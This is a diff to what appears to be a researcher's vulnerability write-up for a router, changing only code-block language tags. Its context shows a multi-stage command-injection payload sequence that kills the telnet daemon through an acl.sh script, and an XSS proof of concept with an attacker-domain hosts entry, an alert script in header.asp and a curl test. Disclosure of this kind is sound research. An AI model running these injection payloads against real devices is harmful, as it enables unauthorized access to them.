@@ -49,7 +49,7 @@ However there was one big limitation with this injection point: the payload leng
 
  After many failed attempts, I came out with the solution to my problem that could be defined a multi-stage exploit. In particular I've noticed that it was possible to inject commands multiple times inside the acl.sh script and all of them were executed, so the problem was to find a correct 13-chars-length command sequence that would have allowed to stop and then restart telnet service. I think there are different ways to do this, mine is the following:
 
-```python
+```
 Payload 1: 'ps|grep tel>a'     # identify telnet pid grepping ps output and store it in file a 
 Payload 2: 'grep -v gr a>b'    # remove unwanted line
 Payload 3: 'kill $(cat b)'     # kill utelnetd
@@ -106,13 +106,13 @@ in order to exploit this vulnerability in the wild, an attacker has to register 
 As example, I used the domain `a-tt.com` as the attacker's domain and I managed to simulate its existence adding a line to my `hosts` configuration file. 
 The command showed below will force your pc to resolve the attacker's domain `a-tt.com` with the 127.0.0.1 IP address. 
 
-```bash
+```
 127.0.0.1	a-tt.com
 ```
 
 The second step needed is to create an `asp` file called `header.asp` with the real exploit payload, this code will be executed by the victim's browser so you can add whatever you want. Reading the following steps the reason why the file needs to have this particular name and extension is clear. Since this is just a test, I created the following simple alert script that will prove the presence of the vulnerability by prompting a JavaScript popup.
 
-```html
+```Javascript
 <html>
     <h1>Attacker's Site</h1>
     <script>alert('XSS in domain: '+document.domain)</script>
@@ -126,7 +126,7 @@ Serving HTTP on 0.0.0.0 port 80 ...
 ```
 
 Now it is possible to test our configuration:
-```
+```Javascript
 $ curl http://a-tt.com/header.asp
 <html>
 <h1>Attacker's Site</h1>
